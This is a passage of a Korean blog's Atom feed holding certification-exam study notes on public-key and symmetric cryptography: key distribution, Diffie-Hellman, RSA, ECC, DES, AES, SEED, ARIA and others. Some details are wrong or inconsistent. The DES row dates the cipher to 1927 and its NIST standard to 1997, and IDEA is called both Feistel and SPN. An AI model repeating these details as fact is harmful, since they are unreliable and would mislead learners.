                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="비칭키 암호" /><summary type="html">비대칭키 암호 키 배송 문제 개요 대칭키 암호를 사용하려면 키 배송 문제(key distribution problem) 발생 암호화 키와 복호화 키가 동일 키 배송 중 도청 가능성 해결방안 키의 사전 공유에 의한 해결 키배포 센터에 의한 해결 Diffie-Hellman 키 교환에 의한 해결 공개키 암호에 의한 해결 키의 사전 공유에 의한 해결 안전한 키를 사전에 공유함 안전한 통로를 이용함 Trusted Authority (TA : 키관리기관) 인원이 많아지면 키가 많아져서 문제 n명의 사원이 자신 외의 사람과 통신시 키는 n(n-1)/2 이다. 키배포 센터에 의한 해결 KDC (Key Distribution Center : 온라인 키 분배 - 일종의 TA) 암호 통신이 필요해질 때마다 통신용 키를 키배포 센터라는 신뢰받은 3자에 의해 공유 과정 1 : A 가 KDC에 B와 통신을 하겠다고 요청 2 : KDC는 DB에서 A의 키와 B의 키를 추출(비밀키) 3 : KDC는 A의 키, B의 키를 이용해 세션키를 생성, 각각 비밀키로 암호화함 4 : A 에게 A의 키를 이용해 암호화한 세션키를 전달 5 : B 에게 B의 키를 이용해 암호화한 세션키를 전달 6 : A 는 자신의 개인키를 이용해 세션키를 복호화 7 : A 는 세션키를 이용해 전송할 메시지를 암호화하여 B에게 전송 8 : B 는 자신의 개인키를 이용해 세션키를 복호화 9 : B 는 세션키를 이용해 A에게 전송받은 메시지를 복호화 10 : 통신 종료 후 세션키는 폐기 Diffie-Hellman 키 교환에 의한 해결 개요 1976년 공개키 암호방식을 최초로 제안한 휘트필드 디피와 마틴 헬먼이 발명한 알고리즘 공개키 암호방식의 개념을 이용하여 두 사용자 간에 공통의 암호화키를 안전하게 공유할 수 있는 방법 제시 (최초의 비밀키 교환 프로토콜) Diffie-Hellman 프로토콜 방법에서는 양쪽 통신 주체가 KDC 없이 대칭 세션키를 생성, 대칭키를 만들기 전에 두 개의 수 p와 g를 선택해야 함. p는 매우 큰 소수로서 300자리가 넘는 십진수 키 교환이라는 이름이 붙어있지만 키 교환이 아니라 공유할 키를 계산하여 만들어 내는 것, 때문에 키 합의(Diffie-Hellman key agreement)로 불리기도 함 유한체상의 이산대수문제를 풀기 어렵다는 사실이 이를 뒷받침함 Diffie-Hellman의 안정성 두 가지 공격에 약점을 보임, 이산대수공격, 중간자 공격 이산대수공격 키 교환의 안정성을 이산대수문제를 풀기 어렵다는데 기반을 둔다. Eve가 R1과 R2를 가로챌 수 있으므로 대칭키 K를 계산할 수 있다. A : R1 (공개값) = g^x mod p B : R2 (공개값) = g^y mod p A 는 R1을 B에 전송 B 는 R2을 A에 전송 A : K = R2^x mod p B : K = R1^y mod p K = g^xy mod p Eve 가 R1, R2 를 가로채 x,y 를 추출하여 K를 생성할 수 있음 x, y값을 추출해내서 더 이상 비밀키가 비밀이 되지 않는다. 중간자 공격(man in the middle attack) 키 교환 프로토콜은 인증 단계가 없어서 이런 공격에 취약 공격을 막기 위해 디지털서명과 공개키 인증서 등을 이용하면 됨 DoS 공격 Diffie-Hellman 은 지수함수에 기초하고 있어 계산이 복잡함 동시에 통신 시 비밀키 생성 시 많은 부하가 걸림 키 생성을 다수 요청하면 서버가 마비됨 공개키 암호에 의한 해결 개요 대칭키 암호에서 암호화키와 복호화키는 같다. 공개키 암호에서는 이 두개가 다르다. 수신자는 미리 암호화키 (공개키) 를 송신자에게 알려준다. Eve 에게 알려져도 괜찮다. 송신자는 암호화키 (공개키) 로 암호화하여 수신자에게 보낸다. 복호화는 복호화키 (개인키) 를 가지고 있는 사람(수신자)만 가능하다. 이러면 복호화키를 전달할 필요가 없다. 공개키 암호 (public-key cryptography) 개요 대칭키 암호는 평문을 복잡한 형태로 변환해서 기밀성을 유지 공개키 암호는 수학적으로 해결하기 곤란한 문제 (소인수분해, 이산대수…) 를 토대로 해서 기밀성을 유지 전자문서의 무결성, 전자서명(부인방지) 구현에 활용 다양한 암호 프로토콜에 사용 공개키 암호에서는 암호화키와 복호화키가 분리되어 있음. 수학적으로 해결하기 곤란한 문제 소인수분해 문제 RSA Rabin 이산대수 문제 ElGamal DSA (DSS) ECC (타원곡선) ECDSA KCDSA 과정 1 : A가 세션키를 B의 공개키로 암호화 2 : A가 암호화된 세션키를 B에 전송 3 : B가 B의 개인키로 암호화된 세션키를 복호화 B의 공개키 / 개인키는 수학적으로 밀접한 관계가 있음 4 : A 와 B의 키 교환 완료 RSA 암호시스템 개요 기본 개념 RSA 는 공개키 암호 알고리즘 중 하나 세계적으로 사실상 표준 Rivest-Shamir-Adelman 의 첫 글자를 따서 붙여짐 인수분해 문제해결의 높은 난이도를 이용한 가장 대표적인 공개키 암호 알고리즘 디지털 서명의 용도로도 사용됨 SSL 프로토콜을 가진 웹 브라우저, PGP, 공개키 암호시스템을 사용하는 정부 시스템 등에서 사용 암호화와 복호화 RSA는 e와 d 두 지수를 사용 A (송신자) : C = P^e mod n B (수신자) : P = C^d mod n e : 공개하는 값 d : 비밀로 유지하는 값 P : 평문 C : 암호문 n : 매우 큰 수 RSA 에 대한 공격 소인수분해 공격 RSA 는 모듈러 값이 매우 커서 이 값을 적절한 시간 내에 소인수분해 하는 것이 불가능 B (수신자) 은 p와 q 를 선택하고 n = p * q 를 계산 n은 공개되지만 p와 q 는 비밀임 Eve가 n을 소인수분해하여 p와 q를 구할 수 있다면 Pi(N) 을 구할 수 있음 소인수분해 알고리즘 (Factoring Attack) 이 개발되지 않는다면 RSA는 안전하다고 할 수 있음 중간자 공격 중간자 공격은 기밀성에 매우 유효한 공격 방법 적극적 공격자 멜로리가 송신자와 수신자 사이에 들어가서 송신자에 대해서는 수신자처럼, 수신자에 대해서는 송신자처럼 행세하는 공격 중간자 공격을 막기 위해서는 입수한 공개키가 밥의 것이라는 것을 확인할 수단인 인증이 필요하다. Rabin 암호시스템 개요 M.Rabin 이 고안, RSA 암호시스템의 변형 RSA는 지수 합동, Rabin은 2차 합동에 근거 암호화와 복호화 Rabin 암호시스템에서 암호화는 매우 간단, 한 번의 곱셈으로 이루어짐 성능이 낮은 플랫폼에서 잘 활용됨 (스마트 카드 등) Rabin 시스템의 보안 p와 q 가 충분히 크기만 하면 안전 (mod N을 구하는 것이 어려움) RSA 만큼 안전 ElGamal 방식 개요 Taher ElGamal 이 발명 이산대수 문제에 근거해서 만든 시스템 (오픈 소스를 기초, 키 분배 방식 및 공개키 암호 방식 실현) 디지털 서명, 암호화, 키교환 Diffie-Hellman 암호화 기능의 확장, 속도가 느림 암호화와 복호화 Bob의 공개키를 이용해 누구든 Bob에게 메시지를 보낼 수 있음 고속 지수 알고리즘을 사용하면 다항식 정도의 복잡도를 가지는 시간 내에 수행 가능 암호화에서는 암호문의 길이가 평문의 2배가 되어 버린다는 결점 응용 RSA 를 활용할 수 있는 곳에는 어디에서나 사용 가능 키 교환, 인증, 짧은 메시지의 암호화와 복호화에 사용 암호 소프트웨어 GnuPG에 구현되어 있음 타원곡선 암호 (ECC, elliptic curve cryptosystem) 등장배경 RSA 와 ElGamal 이 안전한 비대칭키 암호시스템이기는 하지만 보안을 위해서 키의 길이가 매우 커야한다는 단점이 있음 따라서 키의 길이가 짧아도 되는 암호시스템을 연구 -&amp;gt; ECC 타원곡선 이론에 근거 특징 유한체 위에서 정의된 타원곡선 군에서의 이산대수 문제에 기초한 공개키 알고리즘 RSA 암호방식에 이어 전자상거래의 핵심 기술로 주목 1985년 코블리치(N.Koblitz) 와 밀러(V.S.Miller)가 RSA 암호방식의 대안으로 처음 제안 RSA보다 키의 비트 수를 적게 하면서도 동일한 성능을 제공하는 것이 특징 160비트 ECC는 1024비트 RSA 키와 동일한 보안수준 다양한 암호방식 설계가 용이 H/W 와 S/W 로 구현하기 용이 스마트카드나 무선통신단말기 등과 같이 메모리 처리능력이 제한된 응용 분야에 특히 효율적 전자상거래의 핵심 ECC 는 RSA 보다 상대적으로 지명도가 부족, 배경이론이 복잡하며 해당 분야의 전문가가 적다는 단점이 있음 빠른 속도로 구현이 가능 ECC 와 RSA 방식 비교 항목 ECC 방식 RSA 방식 기반구조 WPKI(무선) PKI(유선) 속도 우수 느림 키 크기 상대적으로 작은 키 ECC에 비해 큰 키 적용 소형 Mobile환경 인프라가 다소 구현된 환경</summary></entry><entry><title type="html">정보보안 - 대칭키 암호</title><link href="https://bluesplatter.com/is_certification/IS-Management-SymmetricKeyAlgorithm/" rel="alternate" type="text/html" title="정보보안 - 대칭키 암호" /><published>2021-07-26T09:00:00+09:00</published><updated>2021-07-26T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-SymmetricKeyAlgorithm</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-SymmetricKeyAlgorithm/">&lt;h1 id=&quot;대칭키-암호의-종류&quot;&gt;대칭키 암호의 종류&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;DES (Data Encryption Standard)
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;NIST(미국 국립기술표준원) 에서 1973년 국가적으로 사용할 대칭키 암호시스템 제안요청서를 발표&lt;/li&gt;
          &lt;li&gt;IBM의 제안으로 DES가 채택됨&lt;/li&gt;
          &lt;li&gt;FIPS(연방정보처리기준) 의 초안으로 공표&lt;/li&gt;
          &lt;li&gt;DES 발표 후 가장 널리 사용된 대칭키 블록 암호&lt;/li&gt;
          &lt;li&gt;이후 삼충 DES 사용을 권고한 FIPS 46-3 발표&lt;/li&gt;
          &lt;li&gt;최신 AES 는 DES 를 대체한 알고리즘&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;개관
        &lt;ul&gt;
          &lt;li&gt;평문의 길이는 64비트, 키의 길이는 56비트, 이보다 길면 64비트 블록으로 나눔&lt;/li&gt;
          &lt;li&gt;DES 구조는 Feistel 네트워크의 변형, 라운드 회수는 16&lt;/li&gt;
          &lt;li&gt;원래 키로부터 16개의 서브키를 생성하고 서브키를 각 라운드에서 사용&lt;/li&gt;
          &lt;li&gt;DES 복호화 과정은 암호화 과정과 동일&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DES의 구조
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;두 개의 전치(P-박스)와 16개의 Feistel 라운드 함수로 구성&lt;/li&gt;
              &lt;li&gt;P-박스는 초기 전치(initial Permutation) 과 최종 전치(Final Permutation) 임&lt;/li&gt;
              &lt;li&gt;암호화
                &lt;ul&gt;
                  &lt;li&gt;
                    &lt;table&gt;
                      &lt;tbody&gt;
                        &lt;tr&gt;
                          &lt;td&gt;Plain Text&lt;/td&gt;
                          &lt;td&gt;Plain Text (평문을 절반으로 자름)&lt;/td&gt;
                        &lt;/tr&gt;
                      &lt;/tbody&gt;
                    &lt;/table&gt;
                  &lt;/li&gt;
                  &lt;li&gt;P-Box&lt;/li&gt;
                  &lt;li&gt;1 Round
                    &lt;ul&gt;
                      &lt;li&gt;R2 = L1 XOR F1(R1)&amp;lt;-K1&lt;/li&gt;
                      &lt;li&gt;L2 = R2&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;…&lt;/li&gt;
                  &lt;li&gt;16 Round (교차 없음)
                    &lt;ul&gt;
                      &lt;li&gt;R16 = R15&lt;/li&gt;
                      &lt;li&gt;L16 = L15 XOR F15(R15)&amp;lt;-K15&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;P-Box&lt;/li&gt;
                  &lt;li&gt;64Bit 암호문(Cipher Text)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;복호화도 동일하게 마지막 라운드에 교차 없음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;라운드 함수
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;DES 는 16번의 라운드 함수를 사용&lt;/li&gt;
                  &lt;li&gt;각 라운드 함수는 Fiestal 암호로 되어있음&lt;/li&gt;
                  &lt;li&gt;라운드 함수는 이전 라운드 함수의 출력 값 L-1 과 R-1 을 입력으로 받고 다음 라운드에 입력으로 전송될 L 과 R을 생성&lt;/li&gt;
                  &lt;li&gt;각 라운드에는 2개의 암호 요소 혼합기(mixer) 와 교환기 (swapper) 가 있음, 이런 요소들은 역연산이 가능함&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;DES 함수
                &lt;ul&gt;
                  &lt;li&gt;DES 의 핵심은 함수&lt;/li&gt;
                  &lt;li&gt;라운드 함수에서 사용된 함수를 가리킴&lt;/li&gt;
                  &lt;li&gt;DES 함수는 32비트 출력값을 산출하기 위해 가장 오른쪽의 32비트에 48비트 키를 적용&lt;/li&gt;
                  &lt;li&gt;DES 함수는 확장 P-박스, 키 XOR, 8개의 S-박스 그리고 단순 P-박스의 4개 부분으로 구성
                    &lt;ul&gt;
                      &lt;li&gt;예시
                        &lt;ul&gt;
                          &lt;li&gt;32Bit 입력&lt;/li&gt;
                          &lt;li&gt;확장 P-박스 (48Bit)&lt;/li&gt;
                          &lt;li&gt;48Bit XOR Key (48Bit)&lt;/li&gt;
                          &lt;li&gt;S-Box (8개)&lt;/li&gt;
                          &lt;li&gt;32Bit 출력&lt;/li&gt;
                          &lt;li&gt;단순 P-박스&lt;/li&gt;
                          &lt;li&gt;32Bit 결과&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;암호화 알고리즘과 복호화 알고리즘
            &lt;ul&gt;
              &lt;li&gt;라운드 키들이 역순으로 적용되어야 한다는 사실이 중요&lt;/li&gt;
              &lt;li&gt;암호화 과정에서 1라운드는 K1, 복호화 과정에서 1라운드는 K16&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DES 분석
        &lt;ul&gt;
          &lt;li&gt;설계 기준
            &lt;ul&gt;
              &lt;li&gt;S-박스
                &lt;ul&gt;
                  &lt;li&gt;각 라운드에서 그 다음 라운드까지 혼돈과 확산 성질을 만족하도록 설계&lt;/li&gt;
                  &lt;li&gt;비선형 함수&lt;/li&gt;
                  &lt;li&gt;입력 값의 한 비트를 바꾸면 출력 값에서 두 비트 이상 바뀜&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;P-박스
                &lt;ul&gt;
                  &lt;li&gt;32비트에서 32비트로 가는 하나의 단순 P-박스&lt;/li&gt;
                  &lt;li&gt;32비트에서 48비트로 가는 하나의 확장 P-박스&lt;/li&gt;
                  &lt;li&gt;2개의 P-박스는 비트들을 동시에 확산(diffusion) 시킴&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;DES의 취약점
            &lt;ul&gt;
              &lt;li&gt;키의 크기(56비트)&lt;/li&gt;
              &lt;li&gt;키에 대한 전수 조사를 위해 2의 56승 키를 조사&lt;/li&gt;
              &lt;li&gt;전사공격 가능
                &lt;ul&gt;
                  &lt;li&gt;다중 DES 사용&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;다중 DES
        &lt;ul&gt;
          &lt;li&gt;삼중 DES
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;두 개의 키를 갖는 삼중 DES 와 세 개의 키를 갖는 삼중 DES가 있음&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;두 개의 키를 갖는 삼중 DES (DES-EDE2)
                &lt;ul&gt;
                  &lt;li&gt;두 개의 키를 갖는 삼중 DES 에서는 k1과 k2 두 개의 키를 사용&lt;/li&gt;
                  &lt;li&gt;첫 번째와 세번째 단계에서는 k1, 두 번째 단계에서는 k2를 사용&lt;/li&gt;
                  &lt;li&gt;하나의 DES로 삼중 DES를 만들기 위하여 암호화 과정의 중간 단게에서는 복호화 알고리즘을 사용하고, 복호화 과정에서는 DES 암호화 알고리즘을 사용&lt;/li&gt;
                  &lt;li&gt;기지평문 공격에 취약&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;세 개의 키를 갖는 삼중 DES (Triple-DES)
                &lt;ul&gt;
                  &lt;li&gt;세 개의 키 k1, k2, k3 를 사용&lt;/li&gt;
                  &lt;li&gt;P -&amp;gt; 암호화(k1) -&amp;gt; 복호화(k2) -&amp;gt; 암호화(k3) -&amp;gt; 암호문&lt;/li&gt;
                  &lt;li&gt;PGP (이메일 보안, Pretty Good Privacy) 에서 사용&lt;/li&gt;
                  &lt;li&gt;기지평문 공격 보완&lt;/li&gt;
                  &lt;li&gt;복호화 : 암호화의 역&lt;/li&gt;
                  &lt;li&gt;트리플 DES에서 모든 키를 동일하게 하면 3DES는 보통 DES와 같아짐&lt;/li&gt;
                  &lt;li&gt;과거에 DES로 암호화된 암호문을 3DES를 사용하여 복호화 가능&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;AES
    &lt;ul&gt;
      &lt;li&gt;개요
        &lt;ul&gt;
          &lt;li&gt;역사
            &lt;ul&gt;
              &lt;li&gt;1997년 미국 국립기술표준원(NIST)은 DES를 대체하기 위해 Advanced Encryption Standard(AES) 암호 알고리즘을 공모&lt;/li&gt;
              &lt;li&gt;NIST의 제안 요청서
                &lt;ul&gt;
                  &lt;li&gt;128비트 블록크기&lt;/li&gt;
                  &lt;li&gt;128, 192, 256 비트의 세 가지 키 크기&lt;/li&gt;
                  &lt;li&gt;공개 알고리즘으로 누구나 이용 가능해야 함&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;레인달(Rijndael) AES 알고리즘 선택&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;선정기준
            &lt;ul&gt;
              &lt;li&gt;안정성&lt;/li&gt;
              &lt;li&gt;비용&lt;/li&gt;
              &lt;li&gt;구현 효율성&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;라운드(Rounds)
            &lt;ul&gt;
              &lt;li&gt;AES는 128비트 평문을 128비트 암호문으로 출력하는 알고리즘&lt;/li&gt;
              &lt;li&gt;Non-feistel 알고리즘&lt;/li&gt;
              &lt;li&gt;10 (128bit key), 12 (192bit key), 14 (256bit key) 라운드 사용&lt;/li&gt;
              &lt;li&gt;AES-128, AES-192, AES-256 으로 불림&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;암호(Ciphers)
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;DES : Feistel 네트워크를 기본 구조로 사용&lt;/li&gt;
              &lt;li&gt;Rijndael : SPN (Substitution-Permutation Network) 구조 사용&lt;/li&gt;
              &lt;li&gt;연산은 바이트 단위의 연산을 사용&lt;/li&gt;
              &lt;li&gt;S-Box 를 이용한 치환, 행이동, 행연산 열변환, 키연산 열변환의 4가지 기본연산을 수행&lt;/li&gt;
              &lt;li&gt;알려진 공격방법들로부터 안전하도록 설계&lt;/li&gt;
              &lt;li&gt;하드웨어, 소프트웨어 구현 시 속도나 코드 압축성 면에서 효율적&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;SPN 구조
            &lt;ul&gt;
              &lt;li&gt;라운드 함수가 역변환이 되어야 한다는 등의 제약이 있음&lt;/li&gt;
              &lt;li&gt;더 많은 병렬성을 제공&lt;/li&gt;
              &lt;li&gt;입력을 여러 개의 소블록으로 나누고 각 소블록을 S-box에 입력하여 치환, S-box의 출력을 P-box로 전치하는 과정 반복&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Feistel 과 SPN 구조 알고리즘
            &lt;ul&gt;
              &lt;li&gt;Feistel : DES, Blowfish, MISTY, RC5&lt;/li&gt;
              &lt;li&gt;SPN : IDEA, Rijndael (AES), Square&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;DES 와 AES 의 비교&lt;/p&gt;

            &lt;table&gt;
              &lt;thead&gt;
                &lt;tr&gt;
                  &lt;th style=&quot;text-align: center&quot;&gt;구분&lt;/th&gt;
                  &lt;th style=&quot;text-align: center&quot;&gt;DES&lt;/th&gt;
                  &lt;th style=&quot;text-align: center&quot;&gt;AES&lt;/th&gt;
                &lt;/tr&gt;
              &lt;/thead&gt;
              &lt;tbody&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;년도&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;1976&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;1999&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;블록크기&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;64bits&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;128bits&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;키 길이&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;56bits&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;128,192,256bits&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;암호화 프리미티브&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;치환,전치&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;치환,시프트,비트 혼합&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;암호학적 프리미티브&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;혼돈,확산&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;혼돈,확산&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;설계&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;공개&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;공개&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;설계 원칙&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;비공개&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;공개&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;선택 과정&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;비밀&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;비밀,공모&lt;/td&gt;
                &lt;/tr&gt;
                &lt;tr&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;출처&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;IBM,NSA&lt;/td&gt;
                  &lt;td style=&quot;text-align: center&quot;&gt;벨기에 암호학자&lt;/td&gt;
                &lt;/tr&gt;
              &lt;/tbody&gt;
            &lt;/table&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;기타 대칭키 암호 알고리즘
    &lt;ul&gt;
      &lt;li&gt;IDEA(International Data Encryption Algorithm)
        &lt;ul&gt;
          &lt;li&gt;DES를 대체하기 위해 스위스 연방 기술 기관에서 개발&lt;/li&gt;
          &lt;li&gt;128비트의 키를 사용해 64비트의 평문을 8라운드를 거쳐 64비트 암호문으로 변경&lt;/li&gt;
          &lt;li&gt;Feistel 구조&lt;/li&gt;
          &lt;li&gt;DES 보다 2배 빠름&lt;/li&gt;
          &lt;li&gt;무차별 공격에 더욱 효율적으로 대응&lt;/li&gt;
          &lt;li&gt;PGP 암호화 소프트웨어에서 사용&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;SEED
        &lt;ul&gt;
          &lt;li&gt;KISA 에서 개발한 알고리즘&lt;/li&gt;
          &lt;li&gt;인터넷, 전자상거래, 무선 통신 등에서 공개될 경우 민감한 영향을 끼칠 수 있는 중요 정보 및 개인 정보를 보호하기 위해 개발된 대칭 알고리즘&lt;/li&gt;
          &lt;li&gt;1999년 9월 정보통신단체표준(TTA) 로 제정&lt;/li&gt;
          &lt;li&gt;2005년 국제 표준화 기구인 ISO/IEC 및 IETF에서 국제 블록암호 알고리즘 표준으로 제정
            &lt;ul&gt;
              &lt;li&gt;IEC(International Electro-technical Commission) : 국제전기기술위원회&lt;/li&gt;
              &lt;li&gt;IETF(Internet Engineering Task Force) : 국제 인터넷 표준화기구&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;128비트 비밀키에서 생성된 16개의 64비트 라운드키를 사용하여 16라운드
            &lt;ul&gt;
              &lt;li&gt;2009년에는 256비트 비밀키 사용 (SEED256)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;128비트의 평문 블록을 128비트 암호문 블록으로 출력&lt;/li&gt;
          &lt;li&gt;DES 와 유사한 변형된 Feistel 구조&lt;/li&gt;
          &lt;li&gt;f 함수의 비선형성 안전도에 의존&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ARIA (Academy Research Institute Agency)
        &lt;ul&gt;
          &lt;li&gt;국가보안기술연구소(NSRI) 주도로 학계, 국가정보원 등의 암호기술전문가들이 개발한 국가 암호화 알고리즘&lt;/li&gt;
          &lt;li&gt;ARIA : 개발팀이 학계, 연구소, 정부기관으로 구성됨&lt;/li&gt;
          &lt;li&gt;ISPN(Involutional SPN) 구조&lt;/li&gt;
          &lt;li&gt;128비트 블록 암호&lt;/li&gt;
          &lt;li&gt;128비트, 192비트, 256비트의 3종류의 키 사용을 제공&lt;/li&gt;
          &lt;li&gt;길이에 따라 ARIA-128, ARIA-192, ARIA-256&lt;/li&gt;
          &lt;li&gt;입출력 크기와 사용가능한 키 크기는 미국 표준 블록 암호인 AES와 동일&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;HIGHT (HIGh security and light weigHT)
        &lt;ul&gt;
          &lt;li&gt;KISA, ETRI, 고려대에서 2005년도에 개발&lt;/li&gt;
          &lt;li&gt;2006년에 TTA (정보통신단체) 표준으로 제정됨&lt;/li&gt;
          &lt;li&gt;2010년 ISO/IES 국제표준 암호로 제정&lt;/li&gt;
          &lt;li&gt;64bit 블록암호&lt;/li&gt;
          &lt;li&gt;저전력, 경량화&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;LEA (Lightweight Encryption Algorithm)
        &lt;ul&gt;
          &lt;li&gt;2012년 국가보안기술연구소(NSRI) 가 개발한 경량 고속 암호화 알고리즘&lt;/li&gt;
          &lt;li&gt;128bit 블록암호&lt;/li&gt;
          &lt;li&gt;AES에 비해 1.5~2배 빠름&lt;/li&gt;
          &lt;li&gt;스마트폰, 사물인터넷 등에 사용&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;RC5
        &lt;ul&gt;
          &lt;li&gt;1994년 RSA 연구소에서 개발&lt;/li&gt;
          &lt;li&gt;입출력, 키, 라운드 수가 가변적임&lt;/li&gt;
          &lt;li&gt;32bit, 64bit, 128bit 블록암호&lt;/li&gt;
          &lt;li&gt;DES의 10배의 속도&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;대칭키 암호 정리&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;구분&lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;국가&lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;개발년도&lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;특징&lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;블록크기&lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;키의길이&lt;/th&gt;
          &lt;th style=&quot;text-align: center&quot;&gt;라운드수&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;DES&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;미국&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1927년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;NIST에서 표준으로 공표(1997년)&lt;/td&gt;
